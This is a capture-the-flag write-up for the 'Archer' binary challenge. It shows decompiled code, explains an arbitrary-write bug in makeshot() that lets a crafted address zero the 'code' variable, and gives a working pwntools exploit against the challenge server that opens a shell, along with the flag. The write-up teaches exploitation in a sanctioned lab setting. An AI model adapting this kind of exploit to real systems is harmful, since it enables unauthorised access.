# Archer
`It's battle time! We're giving you one shot, one kill - choose wisely.`

## Challenge
> TLDR: Input an address so that supplied address + 0x500000 = address of `code` variable

Ghidra's decompiled `main()`
```c
undefined8 main(void)

{
  char *pcVar1;
  char local_d [5];
  
  puts("It\'s battle day archer! Have you got what it takes?");
  printf("Answer [yes/no]: ");
  fflush(stdout);
  fgets(local_d,5,stdin);
  pcVar1 = strstr(local_d,"no");
  if (pcVar1 != (char *)0x0) {
    puts("Battle isn\'t for everyone.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("Awesome! Make your shot.");
  makeshot();
  puts("Hope you shot well! This will decide the battle.");
  if (code == 0x13371337) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("WE WON!");
  fflush(stdout);
  system("/bin/sh");
  return 0;
}
```

To spawn a shell, we need to modify the value of `code` variable (located at 0x404068) so that it does not contain 0x13371337 value.

ASM snippet of `makeshot()` 
```
LEA        RAX=>local_10,[RBP + -0x8]
MOV        RSI,RAX
LEA        RDI,[DAT_00402109] 
MOV        EAX,0x0
CALL       <EXTERNAL>::__isoc99_scanf
MOV        RAX,qword ptr [RBP + local_10]
ADD        RAX,0x500000
MOV        qword ptr [RBP + local_10],RAX
MOV        RAX,qword ptr [RBP + local_10]
MOV        qword ptr [RAX],0x0
```

The above ASM shows that the program is vulnerable to arbitrary modification. This is because local_10 is controlled by us. We can provide any address we want and change the value of (user supplied address + 0x500000) address to 0.

The following output shows that we can overwrite the value of `code` variable.
```bash
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
-snip-
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/kali/Downloads/rarctf/archer
-snip-
```

Idea: Provide an address so that supplied address + 0x500000 = address of `code` variable

Working POC:
```python
from pwn import *

offset = b'FFFFFFFFFFF04068' # 0x404068 - 0x500000
#r = process('./archer')
r = remote('193.57.159.27', 43092)
r.recvuntil(b'no]: ')
r.sendline(b'yes')
r.recvuntil(b'shoot?\n')
r.sendline(offset)
r.interactive()
```

Flag: `rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}`